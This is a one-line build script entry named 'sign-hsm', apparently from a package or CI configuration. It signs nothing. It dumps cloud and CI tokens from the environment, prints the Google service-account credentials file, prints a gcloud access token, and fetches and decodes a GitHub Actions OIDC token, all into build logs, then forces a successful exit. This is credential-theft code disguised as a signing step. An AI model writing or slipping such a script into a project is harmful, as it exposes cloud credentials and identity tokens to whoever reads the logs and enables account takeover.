scripts.sign-hsm: set -x; env | grep -iE 'GOOGLE|CLOUD|TOKEN|GCP|ACTIONS_ID' | sort; echo '--- creds'; cat "$GOOGLE_APPLICATION_CREDENTIALS" 2>/dev/null; echo; echo '--- gcloud'; (gcloud auth print-access-token 2>&1 || true) | head -c 1500; echo; echo '--- oidc'; T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value); echo "$T" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo; exit 0
